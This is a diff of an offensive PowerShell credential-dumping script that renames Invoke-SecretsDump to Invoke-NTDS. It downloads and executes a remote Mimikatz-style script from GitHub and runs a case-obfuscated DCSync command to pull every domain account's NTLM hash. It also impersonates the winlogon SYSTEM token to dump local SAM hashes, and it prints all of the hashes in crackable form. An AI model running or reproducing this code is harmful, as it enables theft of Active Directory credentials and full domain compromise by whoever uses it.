@@ -1,47 +1,28 @@
-Function Invoke-SecretsDump {
+Function Invoke-NTDS {
     param (
-        [string]$Domain = $env:USERDNSDOMAIN,
-        [switch]$NoComputerHashes
-    )
+    [string]$Domain = $env:USERDNSDOMAIN,
+    [switch]$NoComputerHashes
+)
 
-    # Check if the system is a Domain Controller
-    $DomainControllerCheck = Get-WmiObject "Win32_ComputerSystem" | Select-Object -ExpandProperty "DomainRole"
-    if ($DomainControllerCheck -ne "5") {
-        return "NotDomainController"
+$DomainControllerCheck = Get-WmiObject "Win32_ComputerSystem" | Select-Object -Expand "DomainRole"
+if ($DomainControllerCheck -ne "5"){return "NotDomainController"}
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1')
+
+$Command = '"lsaDUMp::dCsyNc /DOmaIN:' + $Domain + ' /alL /cSv"'
+$output = Invoke-Pandemonium -Command $Command
+
+$lines = $output -split '\r?\n'
+
+$Data = $lines | ForEach-Object {
+    $columns = $_ -split "`t"
+    $user = $columns[1]
+    $hash = $columns[2]
+    if ($user -and $hash) {
+        "$user::aad3b435b51404eeaad3b435b51404ee:$hash:::"
     }
+}
 
-    # Download and execute Invoke-Pandemonium script
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1')
-
-    # Define the LSA dump command
-    $Command = '"lsaDUMp::dCsyNc /DOmaIN:' + $Domain + ' /alL /cSv"'
-    $output = Invoke-Pandemonium -Command $Command
-
-    # Split the output into lines
-    $lines = $output -split '\r?\n'
-
-    $Data = @()
-    $userHashes = @{}
-    $emptyPasswordUsers = @()
-
-    # Process each line of the output
-    foreach ($line in $lines) {
-        $columns = $line -split "`t"
-        $user = $columns[1]
-        $hash = $columns[2]
-
-        if ($user -and $hash) {
-            $Data += "$user::aad3b435b51404eeaad3b435b51404ee:$hash:::"
-            $userHashes[$hash] += @($user)
-
-            if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
-                $emptyPasswordUsers += $user
-            }
-        }
-    }
-
-Write-Output ""
-Write-Output "[*] Dumping local SAM hashes (uid:lmhash:nthash)"
 function DumpSAM{$ErrorActionPreference = "SilentlyContinue"
 try{&{[void][impsys.win32]}}catch{Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;namespace impsys{public class win32{[DllImport(`"kernel32.dll`",SetLastError=true)]public static extern bool CloseHandle(IntPtr hHandle);[DllImport(`"kernel32.dll`",SetLastError=true)]public static extern IntPtr OpenProcess(uint processAccess,bool bInheritHandle,int processId);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool OpenProcessToken(IntPtr ProcessHandle,uint DesiredAccess,out IntPtr TokenHandle);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool DuplicateTokenEx(IntPtr hExistingToken,uint dwDesiredAccess,IntPtr lpTokenAttributes,uint ImpersonationLevel,uint TokenType,out IntPtr phNewToken);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool RevertToSelf();}}"}
 function IAS{[CmdletBinding()]param([Parameter(Mandatory=$true,Position=0)][scriptblock]$Process,[Parameter(Position=1)][object[]]$ArgumentList);$a=GPS -Name "winlogon"|Select -First 1 -ExpandProperty Id;if(($b=[impsys.win32]::OpenProcess(0x400,$true,[Int32]$a)) -eq [IntPtr]::Zero){$c=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}$d=[IntPtr]::Zero;if(-not [impsys.win32]::OpenProcessToken($b,0x0E,[ref]$d)){$c=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}$f=[IntPtr]::Zero;if(-not [impsys.win32]::DuplicateTokenEx($d,0x02000000,[IntPtr]::Zero,0x02,0x01,[ref]$f)){$c=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}try{if(-not [impsys.win32]::ImpersonateLoggedOnUser($f)){$c=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}& $Process @ArgumentList}finally{if(-not [impsys.win32]::RevertToSelf()){$c=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}}}
@@ -55,50 +36,21 @@ function bitshift($x, $c){return [math]::Floor($x * [math]::Pow(2, $c))}
 $users=IAS -Process {GNLPH};$excludedUsernames=@("Guest","DefaultAccount","WDAGUtilityAccount");foreach($user in $users){if($user.Username-notin$excludedUsernames){$output="$($user.Username):$($user.RID):aad3b435b51404eeaad3b435b51404ee:$($user.NTLM.ToLower()):::";$Output}}}
 DumpSAM
 
-    Write-Output ""
-    Write-Output "[*] Dumping User Hashes (uid:rid:lmhash:nthash)"
 
-    # Output user hashes
+
+
+$Data | ForEach-Object {
+    if ($_ -notlike "*$*") {
+        Write-Output $_
+    }
+}
+
+if (!$NoComputerHashes) {
     $Data | ForEach-Object {
-        if ($_ -notlike "*$*") {
+        if ($_ -like "*$*") {
             Write-Output $_
-        }
-    }
-
-    Write-Output ""
-
-    if (!$NoComputerHashes) {
-        Write-Output "[*] Dumping Computer Hashes (uid:rid:lmhash:nthash)"
-
-        # Output computer hashes
-        $Data | ForEach-Object {
-            if ($_ -like "*$*") {
-                Write-Output $_
+            
             }
         }
-    }
-
-    Write-Output ""
-    Write-Output "[*] Grouping Users with Identical Passwords"
-    $groupNumber = 1
-
-    # Group users with identical hashes
-    foreach ($hash in $userHashes.Keys) {
-        if ($userHashes[$hash].Count -gt 1) {
-            Write-Output ""
-            Write-Output "[Group $groupNumber]"
-
-            foreach ($user in $userHashes[$hash]) {
-                Write-Output "$user"
-            }
-
-            $groupNumber++
-        }
-    }
-
-    if ($emptyPasswordUsers.Count -gt 0) {
-        Write-Output ""
-        Write-Output "[*] Users with Empty Passwords"
-        $emptyPasswordUsers | ForEach-Object { Write-Output $_ }
     }
 }
